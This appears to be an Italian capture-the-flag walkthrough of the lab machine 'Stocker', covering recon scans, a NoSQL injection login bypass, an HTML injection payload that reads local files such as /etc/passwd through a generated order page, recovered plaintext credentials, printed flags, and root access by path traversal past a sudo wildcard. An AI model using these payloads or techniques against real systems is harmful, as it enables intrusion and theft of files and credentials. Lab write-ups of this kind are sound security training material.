@@ -1,0 +1,83 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.11.196
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/Jyuj3D7FuZQdudxWlH081Q6WkdTVz6G05mFSFpBpycfOrwuJpQ6oJV1I4J6UeXg+o5xHSm+ANLhYEI6T/JMnYSyEmVq/QVactDs9ixhi+j0R0rUrYYgteX7XuOT2g4ivyp1zKQP1uKYF2lGVnrcvX4a6ds4FS8mkM2o74qeZj6XfUiCYdPSVJmFjX/TgTzXYHt7kHj0vLtMG63sxXQDVLC5NwLs3VE61qD4KmhCfu+9viOBvA1ZID4Bmw8vgi0b5FfQASbtkylpRxdOEyUxGZ1dbcJzT+wGEhalvlQl9CirZLPMBn4YMC86okK/Kc0Wv+X/lC+4UehL//U3MkD9XF3yTmq+UVF/qJTrs9Y15lUOu3bJ9kpP9VDbA6NNGi1HdLyO4CbtifsWblmmoRWIr+U8B2wP/D9whWGwRJPBBwTJWZvxvZz3llRQhq/8Np0374iHWIEG+k9U9Am6rFKBgGlPUcf6Mg7w4AFLiFEQaQFRpEbf+xtS1YMLLqpg3qB0=
+|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgPXCNqX65/kNxcEEVPqpV7du+KsPJokAydK/wx1GqHpuUm3lLjMuLOnGFInSYGKlCK1MLtoCX6DjVwx6nWZ5w=
+|   256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDyp1s8jG+rEbfeqAQbCqJw5+Y+T17PRzOcYd+W32hF
+80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://stocker.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+[ip]	[host]
+sudo echo "10.10.11.196  stocker.htb" >> /etc/hosts
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://10.10.11.196:80 -w /usr/share/wordlists/dirb/common.txt
+
+Troviamo un sotto dominio dev.stocker.htb e lo aggiungiamo al file /etc/hosts
+---------------------------------------------------------------------------------------------------------------
+Su dev.stocker.htb c'è un login. Lo analizziamo un po' e applicchiamo un po' di injection per capire se possiamo bypassarlo.
+Provo con un SQL inection e stavolta funziona! 
+
+content-type: application/JSON
+{"username":{"$ne":"admin"}, "password":{"$ne":"pass"}}
+
+Ci reindirizza nella pagina /stock, è la pagina di un ecommerce. Tramite burp analizziamo la pagina e vediamo i paramtri che manda quando si aggiunge un elemento al carrello e quando si effettua l'ordine.
+
+Quando effettuiamo l'ordine abbiamo questo input che mandiamo alla pagina
+{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
+
+mandiamo il seguente json
+{"basket":[{"_id":"","title":"<img src='echopwn' onerror=\"document.write('<iframe height=800  width=500 src=file:///etc/passwd></iframe>')\"/>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":1, "amount":1}]}
+
+La pagina risponde con il seguente ID order: 643920537a07a823065056e6
+
+Noi andiamo a vedere la pagina -> http://dev.stocker.htb/api/po/643920537a07a823065056e6
+
+Dove troviamo il file /etc/passwrd
+
+All'interno c'è un utente angoose. Cerchiamo all'interno del sistema, c'è anche un utente MongoDB, troviamo un file index.js con delle credenziali dentro.
+Lo leggiamo nella stessa maniera del file /etc/passwd
+
+Troviamo le seguenti credenziali -> angoose:IHeardPassphrasesArePrettySecure
+
+Facciamo il login e le credenziali funzionando 
+ssh angoose@stocker.htb -> cat user.txt -> 704d70b5a6ff8fa2590fb9a13a60a433
+---------------------------------------------------------------------------------------------------------------
+
+Cerchiamo se l'utente è tra i sudoers
+sudo -l
+
+Matching Defaults entries for angoose on stocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User angoose may run the following commands on stocker:
+    (ALL) /usr/bin/node /usr/local/scripts/*.js
+
+troviamo che può eseguire qualsiasi script in js.
+
+Cerchiamo su internet del codice per leggere da un file
+
+const fs = require('fs')
+ 
+fs.readFile('Input.txt', (err, data) => {
+    if (err) throw err;
+ 
+    console.log(data.toString());
+})
+
+sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/read_flag.js -> 7810e09a6933463c7e42af2addb53763
